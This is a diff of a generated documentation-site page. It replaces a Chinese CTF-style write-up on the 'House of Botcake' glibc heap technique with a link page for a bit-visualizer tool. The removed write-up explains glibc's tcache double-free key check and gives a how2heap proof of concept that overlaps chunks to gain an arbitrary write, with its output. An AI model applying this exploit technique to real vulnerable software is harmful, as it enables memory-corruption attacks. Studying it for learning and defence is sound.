+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_7">
             <span class="md-nav__icon md-icon"></span>
             杂篇
@@ -3638,7 +3558,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../sth/proj/" class="md-nav__link">
+      <a href="../../sth/proj/" class="md-nav__link">
         
   
   
@@ -3658,10 +3578,19 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../../../tools/bit32_visualizer/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -3672,6 +3601,7 @@
   
 
       </a>
+      
     </li>
   
 
@@ -3731,7 +3661,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../sth/ssh/" class="md-nav__link">
+      <a href="../../sth/ssh/" class="md-nav__link">
         
   
   
@@ -3754,7 +3684,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../sth/codex/" class="md-nav__link">
+      <a href="../../sth/codex/" class="md-nav__link">
         
   
   
@@ -3805,50 +3735,6 @@
     
   
   
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#0xff" class="md-nav__link">
-    <span class="md-ellipsis">
-      0xff 背景
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#0x00" class="md-nav__link">
-    <span class="md-ellipsis">
-      0x00 源码分析
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#0x01-attack" class="md-nav__link">
-    <span class="md-ellipsis">
-      0x01 attack
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#0x02" class="md-nav__link">
-    <span class="md-ellipsis">
-      0x02 总结
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
 </nav>
                   </div>
                 </div>
@@ -3864,178 +3750,16 @@
 
 
 
-<h1 id="_1">任意地址写</h1>
-<h2 id="0xff">0xff 背景</h2>
-<p>新版本的glibc(2.29)阻止了tcache poisoning的攻击，我们需要一种新的方式来绕过</p>
-<blockquote>
-<p>tcache攻击允许修改tcache中以释放块的<code>next</code>指针，从而实现任意地址写入。如果所做题目的glibc没有这个限制，我们可以通过直接double free目标块直接实现简单的tcache投毒</p>
-</blockquote>
-<h2 id="0x00">0x00 源码分析</h2>
-<p><strong>tcache_perthred_struct添加key字段</strong></p>
-<p>这个部分位于单链表结构中的<code>bk</code>位置</p>
-<div class="highlight"><pre><span></span><code><span class="w"> </span><span class="cm">/* @@ -2967,6 +2967,8 @@ mremap_chunk (mchunkptr p, size_t new_size) */</span>
-<span class="w"> </span><span class="cm">/* We overlay this structure on the user-data portion of a chunk when</span>
-<span class="cm">    the chunk is stored in the per-thread cache.  */</span>
-<span class="w"> </span><span class="err">@@</span><span class="w"> </span><span class="mi">-2967</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="o">+</span><span class="mi">2967</span><span class="p">,</span><span class="mi">8</span><span class="w"> </span><span class="err">@@</span><span class="w"> </span><span class="n">mremap_chunk</span><span class="w"> </span><span class="p">(</span><span class="n">mchunkptr</span><span class="w"> </span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">new_size</span><span class="p">)</span>
-<span class="w"> </span><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">tcache_entry</span>
-<span class="w"> </span><span class="p">{</span>
-<span class="w">   </span><span class="k">struct</span><span class="w"> </span><span class="nc">tcache_entry</span><span class="w"> </span><span class="o">*</span><span class="n">next</span><span class="p">;</span>
-<span class="o">+</span><span class="w">  </span><span class="cm">/* This field exists to detect double frees.  */</span>
-<span class="o">+</span><span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">tcache_perthread_struct</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">;</span>
-<span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="n">tcache_entry</span><span class="p">;</span>
-</code></pre></div>
-<p>该字段的相关宏被添加到了<code>tcache_put</code>和<code>tcache_get</code>函数中,后文会提到</p>
-<p><strong>double free的安全检查</strong></p>
-<p>当一个块被释放到 tcache 中时，会使用<code>key</code>进行标记。如果想要再次释放到 tcache bin中，这部分代码就会进行检测是否被标记，如果被标记，<code>_int_free</code>就会打印double free报错</p>
-<div class="highlight"><pre><span></span><code><span class="w"> </span><span class="cm">/* @@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx) */</span>
-<span class="w"> </span><span class="cm">/* 调用者必须确保我们知道 tc_idx 是有效的，并且有足够的空间来存放更多的块。 */</span>
-<span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="n">__always_inline</span><span class="w"> </span><span class="kt">void</span>
-<span class="w"> </span><span class="n">tcache_put</span><span class="w"> </span><span class="p">(</span><span class="n">mchunkptr</span><span class="w"> </span><span class="n">chunk</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">tc_idx</span><span class="p">)</span>
-<span class="w"> </span><span class="p">{</span>
-<span class="w">  </span><span class="n">tcache_entry</span><span class="w"> </span><span class="o">*</span><span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">tcache_entry</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">chunk2mem</span><span class="w"> </span><span class="p">(</span><span class="n">chunk</span><span class="p">);</span>
-<span class="w">  </span><span class="cm">/* 将这个块标记为“在 tcache 中”，这样在 _int_free 中的测试就可以检测到双重释放。 */</span>
-<span class="o">+</span><span class="w"> </span><span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tcache_key</span><span class="p">;</span>
-<span class="w">  </span><span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PROTECT_PTR</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">,</span><span class="w"> </span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
-<span class="w">  </span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">e</span><span class="p">;</span>
-<span class="w">  </span><span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
-<span class="w"> </span><span class="p">}</span>
-</code></pre></div>
-<p><strong>tcache_get中的更改</strong></p>
-<p>这里添加了<code>(e-&gt;key=NULL)</code>，它将<code>e</code>指向的结构体中的<code>key</code>成员赋为<code>null</code>。它可以清除<code>key</code>中的信息，以确保元素从缓存中移除后不会指向无效的内存 &lt;= 删除了一个野指针</p>
-<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="cm">/* @@ -3005,6 +3012,7 @@ tcache_get (size_t tc_idx) */</span>
-<span class="w">  </span><span class="n">assert</span><span class="w"> </span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
-<span class="w">  </span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
-<span class="w">  </span><span class="o">--</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
-<span class="o">+</span><span class="w"> </span><span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
-<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">e</span><span class="p">;</span>
-<span class="w"> </span><span class="p">}</span>
-</code></pre></div>
-<p><strong>_int_free中的更改</strong></p>
-<p>这里引入了一个检查，用于确定正在被释放的内存块是否已经在 tcache 中。这通过检查<code>e</code>指向的<code>tcache_entry</code>结构体的<code>key</code>字段来完成。如果<code>e-&gt;key</code>等于<code>tcache</code>，则说明已经在 tcache 中了</p>
-<p>接下来又写了个巧合验证：这个检查可能巧合地与内存中的其它数据匹配，因此并非完全可靠。于是设置了一个循环，验证<code>tcache</code>不为<code>NULL</code>，然后检查<code>e-&gt;key</code>是否等于<code>tcache</code></p>
-<div class="highlight"><pre><span></span><code><span class="w"> </span><span class="err">@@</span><span class="w"> </span><span class="mi">-4218</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="o">+</span><span class="mi">4226</span><span class="p">,</span><span class="mi">26</span><span class="w"> </span><span class="err">@@</span><span class="w"> </span><span class="n">_int_free</span><span class="w"> </span><span class="p">(</span><span class="n">mstate</span><span class="w"> </span><span class="n">av</span><span class="p">,</span><span class="w"> </span><span class="n">mchunkptr</span><span class="w"> </span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">have_lock</span><span class="p">)</span>
-<span class="w"> </span><span class="p">{</span>
-<span class="w">  </span><span class="kt">size_t</span><span class="w"> </span><span class="n">tc_idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">csize2tidx</span><span class="w"> </span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
-<span class="o">+</span><span class="w"> </span><span class="cm">/* 检查它是否已经在 tcache 中。 */</span>
-<span class="o">+</span><span class="w"> </span><span class="n">tcache_entry</span><span class="w"> </span><span class="o">*</span><span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">tcache_entry</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">chunk2mem</span><span class="w"> </span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
-<span class="o">+</span>
-<span class="o">+</span><span class="w"> </span><span class="cm">/* 这个测试在双重释放时会成功。然而，我们不 100% 信任它</span>
-<span class="cm">    （它也可能以 1 in 2^&lt;size_t&gt; 的几率与随机的 payload 数据匹配）</span>
-<span class="cm">     所以在中止前验证这是否并非一个不太可能的巧合。 */</span>
-<span class="o">+</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">__glibc_unlikely</span><span class="w"> </span><span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">tcache</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">tcache</span><span class="p">))</span>
-<span class="o">+</span><span class="w"> </span><span class="p">{</span>
-<span class="o">+</span><span class="w">   </span><span class="n">tcache_entry</span><span class="w"> </span><span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
-<span class="o">+</span><span class="w">   </span><span class="n">LIBC_PROBE</span><span class="w"> </span><span class="p">(</span><span class="n">memory_tcache_double_free</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">,</span><span class="w"> </span><span class="n">tc_idx</span><span class="p">);</span>
-<span class="o">+</span><span class="w">   </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">tmp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span><span class="w"> </span><span class="n">tmp</span><span class="p">;</span><span class="w"> </span><span class="n">tmp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span>
-<span class="o">+</span><span class="w">       </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">tmp</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">e</span><span class="p">)</span>
-<span class="o">+</span><span class="w">           </span><span class="n">malloc_printerr</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;free(): double free detected in tcache 2&quot;</span><span class="p">);</span>
-<span class="o">+</span><span class="w">   </span><span class="cm">/* 如果我们到达这里，那是个巧合。我们浪费了一些周期，但不会中止。 */</span>
-<span class="o">+</span><span class="w"> </span><span class="p">}</span>
-<span class="o">+</span>
-<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">tcache</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">tc_idx</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">mp_</span><span class="p">.</span><span class="n">tcache_bins</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span><span class="p">)</span>
-</code></pre></div>
-<h2 id="0x01-attack">0x01 attack</h2>
-<p>攻击的核心思想就是找到一种方法来修改<code>key</code>值。这里用how2heap的源码进行演示（glibc=2.39）</p>
-<p>在栈上准备一个想要劫持的目标：</p>
-<div class="highlight"><pre><span></span><code><span class="kt">intptr_t</span><span class="w"> </span><span class="n">stack_var</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
-</code></pre></div>
-<p>分配7个块来准备合适的堆布局，填满 tcache</p>
-<p>然后再申请一个用于合并的块<code>prev</code>和攻击块<code>a</code>，以及隔离块，避免合并到top chunk中</p>
-<div class="highlight"><pre><span></span><code><span class="kt">intptr_t</span><span class="w"> </span><span class="o">*</span><span class="n">x</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
-<span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">intptr_t</span><span class="o">*</span><span class="p">);</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="kt">intptr_t</span><span class="w"> </span><span class="o">*</span><span class="n">prev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
-<span class="kt">intptr_t</span><span class="w"> </span><span class="o">*</span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
-<span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
-</code></pre></div>
-<p>此时的堆布局如下图：</p>
-<p><img alt="QQ_1757077273060.png" src="../../images/QQ_1757077273060.png" /></p>
-<p>此时前期的申请已经完成，我们需要开始构造**堆块重叠**</p>
-<ol>
-<li>填满 tcache</li>
-</ol>
-<div class="highlight"><pre><span></span><code><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">7</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
-<span class="p">}</span>
-</code></pre></div>
-<ol>
-<li>释放攻击块<code>a</code>，使其到达ub中</li>
-</ol>
-<div class="highlight"><pre><span></span><code><span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
-</code></pre></div>
-<ol>
-<li>释放前置块<code>prev</code>,使之与攻击块<code>a</code>合并</li>
-</ol>
-<div class="highlight"><pre><span></span><code><span class="n">free</span><span class="p">(</span><span class="n">prev</span><span class="p">);</span>
-</code></pre></div>
-<p>此时的chunk构造如下：</p>
-<p><img alt="image-20250905210622740.png" src="../../images/image-20250905210622740.png" /></p>
-<p>可以看到，此时<code>a</code>块的<code>fd</code>和<code>bk</code>都留在了这个被free的chunk中</p>
-<ol>
-<li>从tcache中取出一个块，然后再次释放攻击块，将其添加到tcache中</li>
-</ol>
-<div class="highlight"><pre><span></span><code><span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
-<span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
-</code></pre></div>
-<blockquote>
-<p>我们可以这么做的原因很简单：攻击块的指针是在他被释放到ub中生成的，因此，现在这些指针和tcache、key没有任何关系，所以我们可以绕过上面提及的安全检查</p>
-<div class="highlight"><pre><span></span><code><span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tcache_key</span><span class="p">;</span>
-<span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">null</span><span class="p">;</span>
-</code></pre></div>
-</blockquote>
-<p>这就导致了**攻击块<code>a</code>同时位于tcache和ub中**</p>
-<p><img alt="image-20250905211416671.png" src="../../images/image-20250905211416671.png" /></p>
-<blockquote>
-<p>[!note]
-合并就是导致这一切可以利用的关键一步。我们通过 malloc <code>prev</code>块，然后覆盖攻击块的元数据。这样我们下次使用<code>malloc</code>从tcache中申请一个大小为<code>0x110</code>的块的时候，我们就可以劫持攻击块的<code>next</code>指针，从而通过下一次的<code>malloc</code>实现任意地址写</p>
-</blockquote>
-<p>{% endnotel %}</p>
-<p>那么我们现在就拥有了<code>chunk overlapping</code>，<code>prev</code>的大小是0x220；<code>a</code>的大小是<code>0x110</code></p>
-<div class="highlight"><pre><span></span><code><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">intptr_t</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
-<span class="kt">int</span><span class="w"> </span><span class="n">a_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="p">[</span><span class="mi">-1</span><span class="p">]</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xff0</span><span class="p">;</span>
-<span class="n">printf</span><span class="p">(</span><span class="s">&quot;victim @ %p, size: %#x, end @ %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="n">a_size</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">a</span><span class="o">+</span><span class="n">a_size</span><span class="p">);</span>
-
-<span class="n">puts</span><span class="p">(</span><span class="s">&quot;Get the target chunk from tcache.&quot;</span><span class="p">);</span>
-<span class="kt">intptr_t</span><span class="w"> </span><span class="o">*</span><span class="n">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">intptr_t</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
-<span class="n">target</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xcafebabe</span><span class="p">;</span>
-
-<span class="n">printf</span><span class="p">(</span><span class="s">&quot;target @ %p == stack_var @ %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="n">stack_var</span><span class="p">);</span>
-<span class="n">assert</span><span class="p">(</span><span class="n">stack_var</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0xcafebabe</span><span class="p">);</span>
-</code></pre></div>
-<p>实现如下效果</p>
-<div class="highlight"><pre><span></span><code>victim<span class="w"> </span>@<span class="w"> </span>0x55e6d4cb8b20,<span class="w"> </span>size:<span class="w"> </span>0x110,<span class="w"> </span>end<span class="w"> </span>@<span class="w"> </span>0x55e6d4cb8c30
-Get<span class="w"> </span>the<span class="w"> </span>target<span class="w"> </span>chunk<span class="w"> </span>from<span class="w"> </span>tcache.
-target<span class="w"> </span>@<span class="w"> </span><span class="nv">0x7ffe559bcd70</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>stack_var<span class="w"> </span>@<span class="w"> </span>0x7ffe559bcd70
-</code></pre></div>
-<p>*以后遇到合适的题补充一个实战</p>
-<h2 id="0x02">0x02 总结</h2>
-<p>所需条件：</p>
-<ul>
-<li>free后指针未置零</li>
-<li>glibc≥2.29</li>
-</ul>
-<p>实现结果：</p>
-<ul>
-<li>堆块重叠</li>
-<li>劫持<code>tcache_entry-&gt;next</code>指针</li>
-<li>实现任意地址写</li>
-</ul>
-<p>参考链接：</p>
-<ul>
-<li><a href="https://4xura.com/binex/house-of-botcake/">https://4xura.com/binex/house-of-botcake/</a></li>
-<li><a href="https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d">https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</a></li>
-<li><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_botcake.c">https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_botcake.c</a></li>
-</ul>
+<h1 id="32">32位位运算可视化工具</h1>
+<p><a href="../bit32_visualizer.html">点击打开工具</a></p>
+<p>如果你希望单独分享地址，可以直接使用：</p>
+<p><code>/tools/bit32_visualizer.html</code></p>
 
 
 
 
 
 
-
-  
-  
 
 
 
@@ -4046,15 +3770,15 @@ target<span class="w"> </span>@<span class="w"> </span><span class="nv">0x7ffe55
   
     <nav class="post-nav" aria-label="文章分页导航">
       
-        <a class="post-nav__link post-nav__link--prev" href="../%E5%85%B3%E4%BA%8Ehouse-of-kiwi%E7%9A%84%E5%AD%A6%E4%B9%A0/">
+        <a class="post-nav__link post-nav__link--prev" href="../../sth/proj/">
           <span class="post-nav__label">上一篇</span>
-          <span class="post-nav__title">House of Kiwi</span>
+          <span class="post-nav__title">proj</span>
         </a>
       
       
-        <a class="post-nav__link post-nav__link--next" href="../../wp/basectf/">
+        <a class="post-nav__link post-nav__link--next" href="../../sth/ssh/">
           <span class="post-nav__label">下一篇</span>
-          <span class="post-nav__title">BaseCTF</span>
+          <span class="post-nav__title">ssh配置</span>
         </a>
       
     </nav>
@@ -4146,14 +3870,14 @@ target<span class="w"> </span>@<span class="w"> </span><span class="nv">0x7ffe55
     
     
       
-      <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy", "content.code.select", "content.code.annotate", "navigation.titles", "navigation.tabs", "navigation.indexes", "navigation.top"], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+      <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.copy", "content.code.select", "content.code.annotate", "navigation.titles", "navigation.tabs", "navigation.indexes", "navigation.top"], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
     
     
-      <script src="../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      <script src="../../assets/javascripts/bundle.f55a23d4.min.js"></script>
       
         <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
       
-        <script src="../../../resources/js/read-metrics.js"></script>
+        <script src="../../resources/js/read-metrics.js"></script>
       
     
   </body>
